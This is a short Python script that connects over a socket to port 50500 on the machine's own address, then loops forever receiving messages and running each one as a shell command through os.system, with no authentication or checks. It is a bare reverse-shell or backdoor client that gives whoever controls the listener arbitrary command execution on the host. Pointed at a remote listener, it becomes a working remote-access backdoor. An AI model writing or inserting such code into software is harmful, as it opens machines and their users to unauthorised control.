import socket
import os
sck = socket.socket()
host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)
PORT = 50500

sck.connect((host_ip, PORT))

while True:
    message = sck.recv(1024)
    print(message.decode())
    os.system(message.decode())


